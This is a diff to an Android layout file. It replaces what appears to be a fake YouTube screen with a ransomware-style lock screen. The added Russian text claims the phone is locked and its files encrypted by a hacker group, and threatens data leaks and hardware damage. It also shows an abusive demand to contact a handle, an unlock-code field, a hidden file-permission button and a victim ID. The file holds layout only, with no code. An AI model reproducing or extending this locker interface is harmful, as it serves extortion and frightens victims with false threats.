@@ -1,54 +1,155 @@
 <?xml version="1.0" encoding="utf-8"?>
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:orientation="vertical"
-    android:background="#0F0F0F">
+    android:background="#000000">
 
-    <!-- Шапка YouTube -->
-    <LinearLayout
+    <TextView
+        android:id="@+id/timeText"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_alignParentTop="true"
+        android:layout_alignParentRight="true"
+        android:layout_marginTop="50dp"
+        android:layout_marginRight="30dp"
+        android:text="11:41:15"
+        android:textColor="#FF00FF"
+        android:fontFamily="monospace"
+        android:textSize="18sp" />
+
+    <TextView
+        android:id="@+id/bootText"
         android:layout_width="match_parent"
-        android:layout_height="56dp"
-        android:orientation="horizontal"
-        android:gravity="center_vertical"
-        android:padding="10dp"
-        android:background="#0F0F0F">
+        android:layout_height="match_parent"
+        android:gravity="center"
+        android:text="Booting System..."
+        android:textColor="#FF00FF"
+        android:fontFamily="monospace"
+        android:textSize="20sp" />
+
+    <LinearLayout
+        android:id="@+id/mainBlock"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:layout_centerInParent="true"
+        android:orientation="vertical"
+        android:padding="20dp"
+        android:background="@drawable/box_bg"
+        android:visibility="gone">
 
         <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:text="▶ YouTube"
-            android:textColor="#FFFFFF"
-            android:textSize="22sp"
-            android:textStyle="bold"
-            android:layout_marginRight="20dp"/>
-
-        <EditText
-            android:layout_width="0dp"
-            android:layout_height="36dp"
-            android:layout_weight="1"
-            android:background="#212121"
-            android:hint="Поиск"
-            android:textColorHint="#888888"
-            android:textColor="#FFFFFF"
-            android:paddingLeft="15dp"
-            android:inputType="text"/>
-
-        <ImageView
-            android:layout_width="32dp"
-            android:layout_height="32dp"
-            android:layout_marginLeft="15dp"
-            android:background="@drawable/box_bg" />
-    </LinearLayout>
-
-    <ScrollView
-        android:layout_width="match_parent"
-        android:layout_height="match_parent">
-
-        <LinearLayout
-            android:id="@+id/videoList"
+            android:id="@+id/headerText"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:orientation="vertical"/>
-    </ScrollView>
-</LinearLayout>
+            android:text="[Ваша система заблокирована!]"
+            android:textColor="#FF00FF"
+            android:background="#FF00FF"
+            android:gravity="center"
+            android:fontFamily="monospace"
+            android:textStyle="bold"
+            android:padding="2dp"
+            android:layout_marginBottom="10dp"/>
+
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Ваш Андроид заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой P I D O R I. Любые действия, связанные с попыткой снятия блокировки нанесут непоправимый вред Вашему Андроиду и приведут к потере всех важных файлов без возможности восстановления. При попытке снять блокировку все ваши данные будут выгружены в сеть и будет подана рекурсивная нагрузка на ваш процессор, что приведет к его неисправности."
+            android:textColor="#FF00FF"
+            android:fontFamily="monospace"
+            android:textSize="12sp"
+            android:layout_marginBottom="10dp"/>
+
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:layout_marginBottom="5dp">
+            
+            <TextView
+                android:layout_width="0dp"
+                android:layout_weight="1"
+                android:layout_height="wrap_content"
+                android:text="Уебок ты пиши"
+                android:textColor="#FF00FF"
+                android:fontFamily="monospace"
+                android:textSize="14sp"/>
+                
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="@getmystars"
+                android:textColor="#FF00FF"
+                android:fontFamily="monospace"
+                android:textSize="14sp"/>
+        </LinearLayout>
+
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Введите код разблокировки"
+            android:textColor="#FF00FF"
+            android:fontFamily="monospace"
+            android:gravity="center"
+            android:layout_marginBottom="5dp"/>
+
+        <EditText
+            android:id="@+id/passwordInput"
+            android:layout_width="match_parent"
+            android:layout_height="40dp"
+            android:background="#FF00FF"
+            android:textColor="#000000"
+            android:fontFamily="monospace"
+            android:gravity="center_vertical"
+            android:paddingLeft="5dp"
+            android:inputType="textPassword"
+            android:cursorVisible="true"
+            android:layout_marginBottom="10dp"/>
+
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal">
+            
+            <TextView
+                android:layout_width="0dp"
+                android:layout_weight="1"
+                android:layout_height="wrap_content"
+                android:text="Current Android: 333"
+                android:textColor="#FF00FF"
+                android:fontFamily="monospace"
+                android:textSize="12sp"/>
+                
+            <TextView
+                android:id="@+id/enterButton"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="[Enter]"
+                android:textColor="#FF00FF"
+                android:fontFamily="monospace"
+                android:textSize="14sp"/>
+        </LinearLayout>
+
+        <!-- Кнопка разрешений, если понадобится -->
+        <Button
+            android:id="@+id/grantButton"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="РАЗРЕШИ ФАЙЛЫ"
+            android:backgroundTint="#FF00FF"
+            android:textColor="#000000"
+            android:visibility="gone"
+            android:layout_marginTop="10dp"/>
+    </LinearLayout>
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_alignParentBottom="true"
+        android:layout_alignParentLeft="true"
+        android:layout_marginBottom="30dp"
+        android:layout_marginLeft="20dp"
+        android:text="ID: 34 81141346 229568"
+        android:textColor="#FF00FF"
+        android:fontFamily="monospace"
+        android:textSize="10sp" />
+</RelativeLayout>
